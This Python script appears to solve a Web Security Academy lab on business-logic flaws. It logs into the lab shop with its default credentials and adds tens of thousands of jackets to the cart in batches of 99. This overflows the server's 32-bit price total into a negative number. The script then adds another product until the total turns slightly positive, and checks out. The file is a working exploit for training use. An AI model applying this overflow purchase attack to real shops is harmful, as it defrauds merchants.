from web_security_academy.core.utils import (
    print_info,
    print_info_secondary,
    print_success,
    print_fail,
)
from bs4 import BeautifulSoup
from ctypes import c_int32

import re


def signed_int32(val):
    return c_int32(val & 0xFFFFFFFF).value


def number_to_currency(n):
    sign = ""
    if n < 0:
        n *= -1
        sign = "-"

    dollars = n // 100
    cents = str(n % 100).zfill(2)
    return f"{sign}${dollars}.{cents}"


def currency_to_number(currency):
    query = re.match(r"\$([0-9]+)\.([0-9]{2})", currency)
    if query is None:
        print_fail(f'Unable to convert "{currency}" into integer.')

    dollars = query.group(1)
    cents = query.group(2)
    return int(dollars) * 100 + int(cents)


def get_product_info(session, productId):
    resp = session.get_path("/product", params={"productId": productId})
    soup = BeautifulSoup(resp.text, "lxml")
    name = soup.select_one(".product h3").text
    price = soup.select_one(".product #price").text
    return name, currency_to_number(price)


def solve_lab(session):
    resp = session.login("wiener", "peter")

    n = 324 * 99 + 47
    print_info(
        f'Adding Lightweight "l33t" Leather Jacket x {n} to cart (Can only do 99 at a time...)'
    )

    i = 0
    while i < n:
        quantity = 99 if n - i > 99 else n - i
        data = {"productId": 1, "quantity": quantity, "redir": "PRODUCT"}
        session.post_path("/cart", data=data, allow_redirects=False)
        i += quantity
        print_info_secondary(
            f"{i} => Total: {number_to_currency(signed_int32(i * 133700))}",
            end="\x1b[1K",
        )
    total = signed_int32(i * 133700)
    print_success(f"{i} => Total: {number_to_currency(total)}\n")

    name, price = get_product_info(session, 2)
    print_info(f"Adding {name} to cart until total is positive...")
    while total <= 0:
        data = {"productId": 2, "quantity": 1, "redir": "PRODUCT"}
        session.post_path("/cart", data=data, allow_redirects=False)
        total += price
        print_info_secondary(f"Total: {number_to_currency(total)}", end="\x1b[1K")
    print_success(f"Total: {number_to_currency(total)}\n")

    csrf = session.get_csrf_token("/cart", n=2)
    print_info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        print_fail("Unable to checkout.")
    else:
        print_success("Success!\n")
        session.get_path(resp.headers["Location"])
